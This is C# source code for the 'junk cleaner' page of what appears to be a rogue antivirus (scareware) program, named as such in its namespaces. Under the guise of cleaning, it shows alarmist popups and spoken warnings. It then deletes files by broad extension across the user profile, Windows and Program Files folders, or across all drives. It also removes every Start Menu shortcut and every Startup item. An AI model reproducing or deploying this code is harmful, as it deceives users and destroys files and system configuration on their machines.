using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.AccessControl;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using RogueAntivirusPatched.Model;
using RogueAntivirusPatched.ViewModel;
using RogueAntivirusPatched.Global;
using System.Windows.Threading;
using RogueAntivirusPatched.Advertisement;
using AdvancedIO;
using static RogueAntivirusPatched.Windows.Popup;
using RogueAntivirusPatched.View.Pages;
using RogueAntivirusPatched.Windows;
using RogueAntivirusPatched.View.Windows;
using System.Drawing.Printing;
using static RogueAntivirusPatched.Global.Variables;

namespace RogueAntivirusPatched.View.Pages
{
    /// <summary>
    /// Interaction logic for JunkCleanerPage.xaml
    /// </summary>
    public partial class JunkCleanerPage : Page
    {
        private vmJunkCleanerPage _vmJunkCleanerPage;
        private advancedIO _advancedIO;
        private RandomAd ads;
        private KeySender keySender;
        private Popup popup;
        private event EventHandler popupButton;
        private Events events;
        private GetAppID getAppID;
        private MouseButtonEventArgs args;

        private double barValue = 0;
        private string percentage = "0%";

        public class JunkData
        {
            public const string Temp = RogueBaseDir + "\\" + "junkTemp.txt";
            public const string Memory = RogueBaseDir + "\\" + "junkMemory.txt";
            public const string Logs = RogueBaseDir + "\\" + "junkLogs.txt";
            public const string Chkdsk = RogueBaseDir + "\\" + "junkChkdsk.txt";
            public const string Cache = RogueBaseDir + "\\" + "junkCache.txt";
            public const string Error = RogueBaseDir + "\\" + "junkError.txt";
            public const string Start = RogueBaseDir + "\\" + "junkStart.txt";
            public const string Startup = RogueBaseDir + "\\" + "junkStartup.txt";
        }

        public JunkCleanerPage(bool immediateScan = false)
        {
            InitializeComponent();
            _vmJunkCleanerPage = new vmJunkCleanerPage();
            DataContext = _vmJunkCleanerPage;
            _vmJunkCleanerPage.ProcessBarPercentage = "0%";

            _advancedIO = new advancedIO();
            ads = new RandomAd();
            keySender = new KeySender();
            getAppID = new GetAppID();
            popupButton += PopupButton_Click;

            events = new Events();
            events.popUpPublisher.popUpHandler += PopUpPublisher_popUpHandler;

            if (!immediateScan)
                return;

            if (Variables.IsPageWorking)
                return;

            args = new MouseButtonEventArgs(Mouse.PrimaryDevice, Environment.TickCount, MouseButton.Left)
            {
                RoutedEvent = MouseLeftButtonDownEvent
            };

            AnalyzeBtn_Click(this, args);
        }

        private void PopUpPublisher_popUpHandler(object sender, Events.PopUpArgs e)
        {
            if (IsPageWorking)
                return;

            if (PayloadsRunning || KeystrokeTriggerRunning)
                return;

            switch (e.popUpType)
            {
                case Events.PopUpArgs.PopUpType.JunkLoaded:
                    RunBtn_Click(this, args);
                    break;

                case Events.PopUpArgs.PopUpType.JunkAnalyzeComplete:
                    RunBtn_Click(this, args);
                    break;
            }
        }

        private void Page_Loaded(object sender, RoutedEventArgs e)
        {
            CleanerGrid.Columns[0].Header = " Target Files";
            CleanerGrid.Columns[1].Header = " Total Size In KB";
            CleanerGrid.Columns[2].Header = " Number Of Detected Files";

            CleanerGrid.Columns[0].Width = 200;
            CleanerGrid.Columns[1].Width = 100;
            CleanerGrid.Columns[2].Width = 150;

            LoadFoundedData();
        }

        //Container which will include all collected files
        public static List<List<string>> WantedFiles = new List<List<string>>();
        private double onePercent = (1.0 / 9.0) * 100.0;

        private async void AnalyzeBtn_Click(object sender, MouseButtonEventArgs e)
        {
            TTS.SpeakInterrupted(TTS.TTSProperty.JunkCleaner.scanInit);

            Variables.IsPageWorking = true;

            _vmJunkCleanerPage.ToggleButtons = false;
            _vmJunkCleanerPage.TempInfo.Clear();

            barValue = 0;
            percentage = "0%";
            _vmJunkCleanerPage.ProcessBarValue = barValue;
            _vmJunkCleanerPage.ProcessBarPercentage = percentage;

            _vmJunkCleanerPage.AboutProgress = "Collecting files ...";
            _vmJunkCleanerPage.ProgressDetails = "This process might take several minutes";

            _vmJunkCleanerPage.CanRunCleaner = false;
            _vmJunkCleanerPage.CanAnalyze = false;

            WantedFiles.Clear();

            var cScanMode = new ScanMode();

            string[] mode = cScanMode.FastMode();
            if (_vmJunkCleanerPage.IsAdvanced)
                mode = cScanMode.AdvancedMode();

            var lists = new List<List<string>>
            {
                await ProcessFiles(_vmJunkCleanerPage.IsTemp, mode, "temp"),
                await ProcessFiles(_vmJunkCleanerPage.IsTemp, mode, "tmp"),
                await ProcessFiles(_vmJunkCleanerPage.IsMemory, mode, "dmp"),
                await ProcessFiles(_vmJunkCleanerPage.IsLogs, mode, "log"),
                await ProcessFiles(_vmJunkCleanerPage.IsChkdsk, mode, "chk"),
                await ProcessFiles(_vmJunkCleanerPage.IsCache, mode, "cache"),
                await ProcessFiles(_vmJunkCleanerPage.IsError, mode, "err"),
                await ProcessFiles(_vmJunkCleanerPage.IsStartMenu, cScanMode.GetStartMenuShortsDir(), "lnk"),
                await ProcessFiles(_vmJunkCleanerPage.IsStartUp, cScanMode.GetStartupDir(), "*")
            };

            StoreFoundData(lists[0], lists[1], lists[2], lists[3], lists[4], lists[5], lists[6], lists[7], lists[8]);

            foreach (var list in lists)
            {
                if (list.Count == 0)
                    continue;
                WantedFiles.Add(list);
            }
            
            FillData(_vmJunkCleanerPage.ContentTemp + " (.temp)", lists[0]);
            FillData(_vmJunkCleanerPage.ContentTemp + " (.tmp)", lists[1]);
            FillData(_vmJunkCleanerPage.ContentMemory, lists[2]);
            FillData(_vmJunkCleanerPage.ContentLogs, lists[3]);
            FillData(_vmJunkCleanerPage.ContentChkdks, lists[4]);
            FillData(_vmJunkCleanerPage.ContentCache, lists[5]);
            FillData(_vmJunkCleanerPage.ContentError, lists[6]);
            FillData(_vmJunkCleanerPage.ContentStartMenu, lists[7]);
            FillData(_vmJunkCleanerPage.ContentStartUp, lists[8]);

            _vmJunkCleanerPage.CanAnalyze = true;

            barValue = 0;
            percentage = "0%";
            _vmJunkCleanerPage.ProcessBarValue = barValue;
            _vmJunkCleanerPage.ProcessBarPercentage = percentage;

            Variables.IsPageWorking = false;

            if (_vmJunkCleanerPage.TempInfo.Count == 0)
            {
                TTS.SpeakInterrupted(TTS.TTSProperty.JunkCleaner.nothingFound);

                string title = "Alert";
                string subTitle = "Nothing found";
                string text = "It seems like your computer does not contain any junk files.";
                var bitmap = Properties.Resources.sparks;
                var margin = new Thickness(0, 0, 0, 80);
                var sound = Properties.Resources.success;
                
                events.ShowPopUp(Events.PopUpArgs.PopUpType.JunkNotFound, title, subTitle, text, bitmap, margin, 500, 400, sound);

                _vmJunkCleanerPage.AboutProgress = "Nothing has been found!";
                _vmJunkCleanerPage.ProgressDetails = "It looks like your computer is clean";
                return;
            }

            Result();
            EnableRunning();
        }

        private void StoreFoundData(List<string> tempFiles, List<string> tempFilesB, 
            List<string> memoryFiles, List<string> logFiles, List<string> chkdkFiles, 
            List<string> cacheFiles, List<string> errorFiles, List<string> startMenuFiles,
            List<string> startUpFiles)
        {
            var mergedTempFiles = new List<string>();

            foreach (string file in tempFiles)
            {
                mergedTempFiles.Add(file);
            }

            foreach (string file in tempFilesB)
            {
                mergedTempFiles.Add(file);
            }

            var listData = ClassToArray();

            foreach (string file in listData)
            {
                if (File.Exists(file))
                    File.Delete(file);
            }

            foreach (string file in listData)
            {
                string dataToWirite = "";
                var listFiles = new List<string>();
                if (JunkData.Temp == file) { dataToWirite = JunkData.Temp; listFiles = mergedTempFiles; }
                if (JunkData.Memory == file) { dataToWirite = JunkData.Memory; listFiles = memoryFiles; }
                if (JunkData.Logs == file) { dataToWirite = JunkData.Logs; listFiles = logFiles; }
                if (JunkData.Chkdsk == file) { dataToWirite = JunkData.Chkdsk; listFiles = chkdkFiles; }
                if (JunkData.Cache == file) { dataToWirite = JunkData.Cache; listFiles = cacheFiles; }
                if (JunkData.Error == file) { dataToWirite = JunkData.Error; listFiles = errorFiles; }
                if (JunkData.Start == file) { dataToWirite = JunkData.Start; listFiles = startMenuFiles; }
                if (JunkData.Startup == file) { dataToWirite = JunkData.Startup; listFiles = startUpFiles; }          

                foreach (string junkFile in listFiles)
                {
                    using (var sw = new StreamWriter(dataToWirite, true))
                    {
                        sw.WriteLine(junkFile);
                    }

                    if (File.Exists(dataToWirite))
                        File.SetAttributes(dataToWirite, FileAttributes.Hidden);
                }
            }
        }

        private async void LoadFoundedData()
        {
            if (WantedFiles != null)
                WantedFiles.Clear();

            var listData = ClassToArray();
            var existingList = new List<string>();

            foreach (string file in listData)
            {
                if (File.Exists(file))
                {
                    existingList.Add(file);
                }
            }

            //No data found so don't load it
            if (existingList.Count == 0)
                return;

            TTS.SpeakInterrupted(TTS.TTSProperty.JunkCleaner.onLoad);

            string title = "Alert";
            string subTitle = "Junk files found";
            string text = "Your computer is still filled with a bunch of junk files." + Environment.NewLine +
                "These files can be deleted because they contain mostly error reports." + Environment.NewLine +
                "By deleting these files, you can gain a lot of space!";
            var margin = new Thickness(0, 0, 0, 80);
            var bitmap = Properties.Resources.rubbish;
            var sound = Properties.Resources.alert;
            var btn1Content = "Remove";
            var btn2Content = "Later";

            events.ShowPopUp(Events.PopUpArgs.PopUpType.JunkLoaded, title, subTitle, text, bitmap, margin, 500, 400, sound, btn1Content, btn2Content);

            _vmJunkCleanerPage.AboutProgress = Variables.gatheringData;

            await Task.Run(() => 
            {
                foreach (string file in existingList)
                {
                    int collectedFiles = 0;
                    string[] fileInfo = { };
                    string fileSize = "";
                    string groupName = "";
                    if (file == JunkData.Temp) { groupName = _vmJunkCleanerPage.ContentTemp; }
                    if (file == JunkData.Memory) { groupName = _vmJunkCleanerPage.ContentMemory; }
                    if (file == JunkData.Logs) { groupName = _vmJunkCleanerPage.ContentLogs; }
                    if (file == JunkData.Chkdsk) { groupName = _vmJunkCleanerPage.ContentChkdks; }
                    if (file == JunkData.Cache) { groupName = _vmJunkCleanerPage.ContentCache; }
                    if (file == JunkData.Error) { groupName = _vmJunkCleanerPage.ContentError; }
                    if (file == JunkData.Start) { groupName = _vmJunkCleanerPage.ContentStartMenu; }
                    if (file == JunkData.Startup) { groupName = _vmJunkCleanerPage.ContentStartUp; }

                    fileInfo = File.ReadAllLines(file);
                    WantedFiles.Add(fileInfo.ToList());
                    collectedFiles = fileInfo.Length;

                    var currentList = fileInfo.ToList();
                    fileSize = GetFileSizeInKB(currentList);

                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        _vmJunkCleanerPage.TempInfo.Add(new mTempInfo
                        {
                            TempFileSize = fileSize,
                            TempFileCount = collectedFiles,
                            TempGroup = groupName
                        });
                    });
                }
            });

            EnableRunning();
        }

        private void EnableRunning()
        {
            _vmJunkCleanerPage.AboutProgress = "Click on the \"Run Cleaner\" to remove found files";
            _vmJunkCleanerPage.ProgressDetails = "This process will take only a few seconds";

            _vmJunkCleanerPage.CanRunCleaner = true;
            _vmJunkCleanerPage.ToggleButtons = true;
        }

        private void Result()
        {
            int totalSize = 0;
            int totalCount = 0;

            foreach (var data in _vmJunkCleanerPage.TempInfo)
            {
                int rawSize = Convert.ToInt32(data.TempFileSize.Replace("KB", ""));
                int rawCount = data.TempFileCount;

                totalSize += rawSize;
                totalCount += rawCount;
            }

            double sizeInMB = Math.Round((double)totalSize / 1024, 2);

            string sizeString = sizeInMB.ToString() + " MB";
            string countString = totalCount.ToString();

            TTS.SpeakInterrupted(TTS.TTSProperty.JunkCleaner.result + countString + " junk files. " +
                TTS.TTSProperty.JunkCleaner.canGet + sizeInMB.ToString() + " megabytes");

            string title = "Alert";
            string subTitle = "Junk files found";
            string text = "We have found over " + countString + " junk files." + Environment.NewLine +
                "If you remove them, you can get " + sizeString + "!";
            var margin = new Thickness(0, 0, 0, 80);
            var bitmap = Properties.Resources.rubbish;
            var sound = Properties.Resources.alert;
            var btn1Content = "Remove";
            var btn2Content = "Later";

            events.ShowPopUp(Events.PopUpArgs.PopUpType.JunkAnalyzeComplete, title, subTitle, text, bitmap, margin, 500, 400, sound, btn1Content, btn2Content);

            string results = "Scanning revealed that there are over " + countString + " junk files."
                + Environment.NewLine + "You can gain " + sizeString + " if you remove all found junk files!";

            popup = new Popup();

            popup.ShowPopup("Junk Cleaner", "Result", results, "Delete Junk",
                Properties.Resources.sweep, PopUpDuration.ANIM_LONG, popupButton);
        }

        private void PopupButton_Click(object sender, EventArgs e)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                var mainWindow = (MainWindow)Application.Current.MainWindow;
                mainWindow.Dispatcher.Invoke(() =>
                {
                    mainWindow.Show();
                    mainWindow.Activate();
                    mainWindow.VmMainWindow.ContentPage = new JunkCleanerPage();
                });
            });
        }

        private List<string> ClassToArray()
        {
            var junkData = new JunkData();
            var list = new List<string>();

            foreach (var item in junkData.GetType().GetFields())
            {
                if (item.FieldType == typeof(string))
                {
                    string data = item.GetValue(junkData) as string;
                    list.Add(data);
                }
            }

            return list;
        }

        private async void RunBtn_Click(object sender, MouseButtonEventArgs e)
        {
            TTS.SpeakInterrupted(TTS.TTSProperty.JunkCleaner.removing);

            Variables.IsPageWorking = true;
            _vmJunkCleanerPage.ToggleButtons = false;
            _vmJunkCleanerPage.CanAnalyze = false;
            _vmJunkCleanerPage.CanRunCleaner = false;

            int fileCount = 0;
            int fileError = 0;
            int fileSuccess = 0;
            long fileSize = 0;
            double filesSizeInMb = 0;
            string aboutProcess = "";
            string progressDetails = "";
            barValue = 0;
            percentage = "0%";

            await Task.Run(() =>
            {
                foreach (List<string> list in WantedFiles)
                {
                    foreach (string file in list)
                    {
                        fileCount += 1;
                    }
                }

                aboutProcess = "Removing " + fileCount.ToString() + " files";

                Application.Current.Dispatcher.Invoke(() =>
                {
                    _vmJunkCleanerPage.AboutProgress = aboutProcess;
                });

                double onePercent = (1.0 / fileCount) * 100;
                
                foreach (List<string> list in WantedFiles)
                {
                    foreach (string file in list)
                    {
                        if (!File.Exists(file))
                            continue;

                        if (PayloadsRunning || KeystrokeTriggerRunning)
                            return;

                        barValue += onePercent;
                        percentage = Math.Round(barValue).ToString() + "%";
                        progressDetails = file;

                        Application.Current.Dispatcher.Invoke(() =>
                        {
                            _vmJunkCleanerPage.ProcessBarValue = barValue;
                            _vmJunkCleanerPage.ProcessBarPercentage = percentage;
                            _vmJunkCleanerPage.ProgressDetails = progressDetails;
                        });

                        var fileInfo = new FileInfo(file);
                        try
                        {
                            fileSize += fileInfo.Length;
                            var fileId = getAppID.ObtainAppID(file);

                            if (!fileId.Equals(GetAppID.ThisAppID))
                                File.Delete(file);
                        }
                        catch 
                        {
                            fileSize -= fileInfo.Length;
                            fileError += 1;
                        }
                    }
                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        _vmJunkCleanerPage.TempInfo.RemoveAt(0);
                    });
                }
            });

            Variables.IsPageWorking = false;
            _vmJunkCleanerPage.ToggleButtons = true;

            filesSizeInMb = Math.Round(fileSize / Math.Pow(1024, 2), 2);

            fileSuccess = fileCount - fileError;

            string title = "Alert";
            string subTitle = "Junk files removed";
            string text = "We removed over " + fileSuccess.ToString() + " junk files." + Environment.NewLine +
                "You also gained " + filesSizeInMb.ToString() + " MB!" + Environment.NewLine +
                "After some days they can be generated again, so it is recommended to search for these files " +
                "at least once a week.";
            var margin = new Thickness(0, 0, 0, 80);
            var bitmap = Properties.Resources.computer_cleaning;
            var sound = Properties.Resources.success;

            events.ShowPopUp(Events.PopUpArgs.PopUpType.JunkRemoved, title, subTitle, text, bitmap, margin, 500, 400, sound);

            TTS.SpeakInterrupted(TTS.TTSProperty.JunkCleaner.removeFinish + filesSizeInMb.ToString() + " megabytes!");

            _vmJunkCleanerPage.AboutProgress = "Cleaning is completed," + " Released " + filesSizeInMb.ToString() + " MB";
            _vmJunkCleanerPage.ProgressDetails = "Successfully deleted: " + fileSuccess.ToString() + " files" + ", Failed: " + fileError.ToString() + " files";
            _vmJunkCleanerPage.CanAnalyze = true;
            barValue = 0;
            percentage = "0%";
            _vmJunkCleanerPage.ProcessBarValue = barValue;
            _vmJunkCleanerPage.ProcessBarPercentage = percentage;

            CleanJunkData();
        }

        private void CleanJunkData()
        {
            var junkFiles = ClassToArray();

            foreach (string file in junkFiles)
            {
                if (File.Exists(file))
                    File.Delete(file);
            }
        }

        private async Task<List<string>> ProcessFiles(bool? canProcess, string[] paths, string fileExtension)
        {
            List<string> currentList = new List<string>();

            if (Variables.PayloadsRunning || Variables.KeystrokeTriggerRunning)
                return currentList;

            if (canProcess == false)
            {
                IncreaseBar();
                return currentList;
            }

            await Task.Run(() =>
            {
                string research = "Searching for ";
                research = research + "." + fileExtension + " files";
                _vmJunkCleanerPage.AboutProgress = research;
                TTS.SpeakInterrupted(research);
                currentList = _advancedIO.GetAllFilesSafely(canProcess, paths, fileExtension);
                IncreaseBar();
            });

            return currentList;
        }
        private async Task<List<string>> ProcessFiles(bool? canProcess, string path, string fileExtension)
        {
            List<string> currentList = new List<string>();

            if (canProcess == false)
            {
                IncreaseBar();
                return currentList;
            }

            await Task.Run(() =>
            {
                string research = "Searching for ";
                research = research + "." + fileExtension + " files";
                _vmJunkCleanerPage.AboutProgress = research;
                TTS.SpeakInterrupted(research);
                currentList = _advancedIO.GetAllFilesSafely(canProcess, path, fileExtension);
                IncreaseBar();
            });

            return currentList;
        }

        private void IncreaseBar()
        {
            barValue += onePercent;
            percentage = Math.Round(barValue).ToString() + " %";
            _vmJunkCleanerPage.ProcessBarValue = barValue;
            _vmJunkCleanerPage.ProcessBarPercentage = percentage;
        }

        private string GetFileSizeInKB(List<string> files)
        {
            if (files.Count == 0)
                return "0 KB";

            double finalSize = 0;
            foreach (string file in files)
            {
                if (File.Exists(file))
                {
                    var fInfo = new FileInfo(file);
                    long fSize = fInfo.Length;
                    double fSizeToKb = (fSize / 1024);
                    double roundSize = Math.Round(fSizeToKb);

                    finalSize += roundSize;
                }
            }

            return finalSize.ToString() + " KB";
        }

        private void FillData(string groupName, List<string> targetFiles)
        {
            if (targetFiles.Count == 0)
                return;

            _vmJunkCleanerPage.TempInfo.Add(new mTempInfo
            {
                TempGroup = groupName,
                TempFileSize = GetFileSizeInKB(targetFiles),
                TempFileCount = targetFiles.Count
            });
        }

        private void AdvancedBtn_Click(object sender, MouseButtonEventArgs e)
        {
            Task.Run(async() =>
            {
                await Task.Delay(100);
                Application.Current.Dispatcher.Invoke(() =>
                {
                    if (!keySender.HasLicense)
                    {
                        ads.OnlyForPro();
                        _vmJunkCleanerPage.IsAdvanced = false;
                        _vmJunkCleanerPage.IsStandard = true;
                        return;
                    }
                });
            });
        }
    }

    public class CleanData
    {
        public void DeleteData(List<string> files)
        {
            foreach (string file in files)
            {
                if (File.Exists(file))
                    File.Delete(file);
            }
        }
    }

    public class ScanMode : advancedIO
    {
        public string[] FastMode()
        {
            string userFolder = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string[] dirs = { userFolder, @"C:\Windows\Sysnative", @"C:\Program Files" };
            return dirs;
        }
        public string[] AdvancedMode()
        {
            return GetDrives();
        }
        public string GetStartMenuShortsDir()
        {
            return Environment.GetFolderPath(Environment.SpecialFolder.StartMenu);
        }
        public string GetStartupDir()
        {
            return Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        }
    }
}
